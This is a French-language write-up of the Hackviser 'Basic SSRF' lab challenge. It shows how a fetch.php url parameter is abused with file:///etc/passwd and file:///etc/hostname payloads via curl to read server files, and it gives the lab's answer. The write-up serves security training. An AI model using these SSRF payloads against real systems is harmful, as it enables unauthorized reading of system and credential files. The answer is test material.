# Writeup : Basic SSRF - Hackviser

## Informations sur le Challenge

- **Nom** : Basic SSRF
- **Plateforme** : Hackviser
- **Difficulté** : VIP / 3 Points
- **Objectif** : Exploiter la vulnérabilité SSRF dans le paramètre `url` pour obtenir le nom d'hôte du serveur.
- **URL Cible** : `https://coherent-night.europe1.hackviser.space`

## Analyse et Reconnaissance

En visitant l'application, on observe une galerie d'images. L'analyse du code source de la page (ou des requêtes réseau) révèle que les images sont chargées via un script PHP intermédiaire :

```html
<img class="slide-img active" alt="Slide 1" src="/fetch.php?url=http://localhost/images/01.jpg">
```

Le script `/fetch.php` prend un paramètre `url` et semble effectuer une requête vers cette URL pour en afficher le contenu. C'est un vecteur classique de **Server-Side Request Forgery (SSRF)**.

## Exploitation

### 1. Test de la vulnérabilité

Pour confirmer la vulnérabilité et vérifier si nous pouvons lire des fichiers locaux, nous essayons d'utiliser le protocole `file://` :

**Payload :**

```
file:///etc/passwd
```

**Commande :**

```bash
curl "https://coherent-night.europe1.hackviser.space/fetch.php?url=file:///etc/passwd"
```

**Résultat :**
Le serveur renvoie bien le contenu du fichier `/etc/passwd`, confirmant que le SSRF permet l'accès au système de fichiers local.

### 2. Récupération du Nom d'Hôte

L'objectif est de trouver le nom d'hôte. Sur les systèmes Linux, cette information est généralement stockée dans `/etc/hostname` (ou parfois disponible via `/proc/sys/kernel/hostname`).

**Payload :**

```
file:///etc/hostname
```

**Commande d'exploitation :**

```bash
curl "https://coherent-night.europe1.hackviser.space/fetch.php?url=file:///etc/hostname"
```

### Résultat Final

La commande retourne la chaîne suivante :

```
reducto
```

Le nom d'hôte du serveur est donc **reducto**.

## Note sur les tentatives précédentes

Les tentatives précédentes semblaient échouer ("Gallery ---") car elles analysaient probablement la réponse de la page racine `index.php` au lieu d'interroger directement le point de terminaison vulnérable `fetch.php`. Le SSRF n'était pas aveugle (blind), mais la sortie se faisait dans un fichier distinct de la page principale.
